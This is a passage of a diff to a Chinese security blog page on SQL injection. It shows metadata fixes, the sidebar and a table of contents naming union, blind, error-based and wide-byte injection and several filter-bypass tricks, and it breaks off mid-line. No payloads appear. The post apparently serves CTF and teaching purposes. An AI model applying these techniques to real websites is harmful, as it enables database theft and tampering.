@@ -15,45 +15,45 @@ document.addEventListener("pjax:success", initScrollReveal);
 <meta property="og:site_name" content="Nayst-blog">
 <meta property="og:description" content="前言注入漏洞在web前十漏洞中位居榜首，其中SQL注入最为经典。 SQL注入什么是SQL注入SQL注入漏洞是指攻击者通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，将恶意SQL语句带入数据库使恶意SQL语句得以执行，从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。 SQL注入漏洞可能会导致服务器的数据库信息泄露、数据被窃取、网页被篡改，甚至可能会造成">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724160925428.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724183800027.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184056134.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184131894.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184513617.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221449012.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221612834.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724224135261.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724230714048.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724232103948.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725110316413.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111053307.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111329442.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111528458.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725144530805.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145257615.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145450328.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725150025086.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125323913.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125809221.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125830823.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125908271.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726130541927.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131604921.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131919320.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726145309481.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726150609315.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726153906638.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154407760.png">
-<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154551164.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724160925428.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724183800027.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184056134.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184131894.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184513617.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221449012.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221612834.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724224135261.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724230714048.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724232103948.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725110316413.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111053307.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111329442.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111528458.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725144530805.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145257615.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145450328.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725150025086.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125323913.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125809221.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125830823.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125908271.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726130541927.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131604921.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131919320.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726145309481.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726150609315.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726153906638.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154407760.png">
+<meta property="og:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726154551164.png">
 <meta property="article:published_time" content="2021-08-30T07:20:42.000Z">
 <meta property="article:modified_time" content="2022-05-01T09:32:13.576Z">
 <meta property="article:author" content="Nayst">
 <meta property="article:tag" content="web漏洞">
-<meta property="article:tag" content="mysql">
 <meta property="article:tag" content="ctf">
+<meta property="article:tag" content="mysql">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png"><script>(function() {
+<meta name="twitter:image" content="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png"><script>(function() {
   const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
   const setting = localStorage.getItem('darken-mode') || 'auto'
   if (setting === 'dark' || (prefersDark && setting !== 'light'))
@@ -69,7 +69,7 @@ IconifyProviders = {
     // Wait for 1 second before switching API hosts
     rotate: 1000,
   },
-};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="Nayst"><img width="96" loading="lazy" src="/images/kakashi.png" alt="Nayst"><span class="site-author-status" title="永远相信美好的事情即将发生">😊</span></a><div class="site-author-name"><a href="/about/">Nayst</a></div><span class="site-name">Nayst-blog</span><sub class="site-subtitle">努力追赶师傅们的一只菜鸡</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">25</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">8</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/N4YST" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ 2495582918" target="_blank" style="color:#12B7F5"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="wechat y1049843745" target="_blank" style="color:#1AAD19"><span class="icon iconify" data-icon="ri:wechat-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2495582918@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:men-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="我的老婆们" style="color:pink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">什么是SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">字符型注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">MySQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.1.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">3.1.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.2.</span> <span class="toc-text">bool盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-floor"><span class="toc-number">3.4.</span> <span class="toc-text">报错注入-floor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-3"><span class="toc-number">3.4.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-3"><span class="toc-number">3.4.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-updatexml"><span class="toc-number">3.5.</span> <span class="toc-text">报错注入-updatexml</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-4"><span class="toc-number">3.5.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-4"><span class="toc-number">3.5.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-extractvalue"><span class="toc-number">3.6.</span> <span class="toc-text">报错注入-extractvalue</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-5"><span class="toc-number">3.6.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-5"><span class="toc-number">3.6.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.7.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-6"><span class="toc-number">3.7.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-6"><span class="toc-number">3.7.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.</span> <span class="toc-text">SQL注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.2.</span> <span class="toc-text">内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.3.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.4.</span> <span class="toc-text">双写关键词绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.5.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.6.</span> <span class="toc-text">等价函数字符替换绕过</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://N4YST.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Nayst"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Nayst-blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">深入了解sql注入</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2021-08-30 15:20:42" itemprop="dateCreated datePublished" datetime="2021-08-30T15:20:42+08:00">2021-08-30</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2022-05-01 17:32:13" itemprop="dateModified" datetime="2022-05-01T17:32:13+08:00">2022-05-01</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">4.2k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">18m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">web安全</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">web漏洞</span></a><a class="tag-item" href="/tags/mysql/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">mysql</span></a><a class="tag-item" href="/tags/ctf/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ctf</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>注入漏洞</strong>在web前十漏洞中位居榜首，其中SQL注入最为经典。</p>
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="Nayst"><img width="96" loading="lazy" src="/images/kakashi.png" alt="Nayst"><span class="site-author-status" title="永远相信美好的事情即将发生">😊</span></a><div class="site-author-name"><a href="/about/">Nayst</a></div><span class="site-name">Nayst-blog</span><sub class="site-subtitle">努力追赶师傅们的一只菜鸡</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">25</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">8</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/N4YST" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ 2495582918" target="_blank" style="color:#12B7F5"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="wechat y1049843745" target="_blank" style="color:#1AAD19"><span class="icon iconify" data-icon="ri:wechat-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2495582918@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:men-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="我的老婆们" style="color:pink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">什么是SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.</span> <span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">字符型注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 